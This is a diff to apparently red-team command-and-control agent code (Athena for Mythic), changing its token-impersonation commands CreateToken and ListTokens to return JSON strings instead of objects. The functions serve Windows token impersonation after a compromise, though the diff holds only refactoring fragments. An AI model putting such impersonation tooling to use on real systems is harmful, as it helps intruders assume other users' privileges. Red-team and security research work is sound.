@@ -22,7 +22,7 @@ namespace Athena.Commands
         /// Create a Token for impersonation
         /// </summary>
         /// <param name="job">The MythicJob containing the token information</param>
-        public async Task<object> CreateToken(MythicJob job)
+        public async Task<string> CreateToken(MythicJob job)
         {
             CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
             SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
@@ -70,7 +70,7 @@ namespace Athena.Commands
                             TokenId = token.TokenId,
                         } }
                         
-                    };
+                    }.ToJson();
                 }
                 else
                 {
@@ -79,7 +79,7 @@ namespace Athena.Commands
                         user_output = $"Failed to create token: {Marshal.GetLastWin32Error()}",
                         completed = "true",
                         task_id = job.task.id,
-                    };
+                    }.ToJson();
                 }
 
             }
@@ -91,7 +91,7 @@ namespace Athena.Commands
                     status = "errored",
                     completed = "true",
                     task_id = job.task.id,
-                };
+                }.ToJson();
             }
         }
         /// <summary>
@@ -117,7 +117,7 @@ namespace Athena.Commands
         /// List available tokens for impersonation
         /// </summary>
         /// <param name="job">The MythicJob containing the token information</param>
-        public async Task<object> ListTokens(MythicJob job)
+        public async Task<string> ListTokens(MythicJob job)
         {
             StringBuilder sb = new StringBuilder();
             sb.AppendLine("Tokens:");
@@ -132,7 +132,7 @@ namespace Athena.Commands
                 completed = "true",
                 user_output = sb.ToString(),
                 task_id = job.task.id,
-            };
+            }.ToJson();
         }
     }
 }
